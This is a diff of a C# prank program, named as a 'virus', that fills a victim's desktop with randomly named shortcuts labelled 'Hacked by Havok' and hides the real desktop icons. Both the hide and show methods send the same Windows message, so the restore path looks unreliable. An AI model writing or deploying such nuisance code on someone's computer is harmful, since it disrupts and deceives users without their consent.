@@ -49,16 +49,15 @@ namespace Havoks_Virus
             }
 
             WshShell shell = new WshShell();
-
-            for (int i = 0; i < 10; i++)
+            string executablePath = Application.ExecutablePath;
+            for (int i = 0; i < 10; i++)    // Adjust the number of icons as needed
             {
                 string prankName = GenerateRandomName();
                 string linkPath = Path.Combine(desktopPath, prankName + ".lnk");
                 IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(linkPath);
-                // Set properties for the shortcut
-                shortcut.Description = "Hacked by Havok";
-                shortcut.IconLocation = iconPath;
-                shortcut.TargetPath = iconPath; // You might want this to point to a real or dummy executable
+                shortcut.Description = "Hacked by Havok"; // Change as needed
+                shortcut.IconLocation = iconPath;  // Ensure this points to an .ico file
+                shortcut.TargetPath = executablePath;                          //"C:\\Windows\\System32\\notepad.exe"; // Point to a benign or dummy target for the shortcut
                 shortcut.Save();
             }
         }
@@ -77,19 +76,21 @@ namespace Havoks_Virus
 
         public void HideDesktopIcons()
         {
-            IntPtr hWnd = FindWindow("Progman", null);
+            IntPtr hWnd = FindWindow("Progman", "Program Manager");
             if (hWnd != IntPtr.Zero)
             {
-                SendMessage(hWnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
+                // 0x7402 is specific to hiding desktop icons
+                SendMessage(hWnd, WM_COMMAND, new IntPtr(0x7402), IntPtr.Zero);
             }
         }
 
         public void ShowDesktopIcons()
         {
-            IntPtr hWnd = FindWindow("Progman", null);
+            IntPtr hWnd = FindWindow("Progman", "Program Manager");
             if (hWnd != IntPtr.Zero)
             {
-                SendMessage(hWnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
+                // Specific command to show desktop icons might vary, ensure it's correct
+                SendMessage(hWnd, WM_COMMAND, new IntPtr(0x7402), IntPtr.Zero);
             }
         }
     }
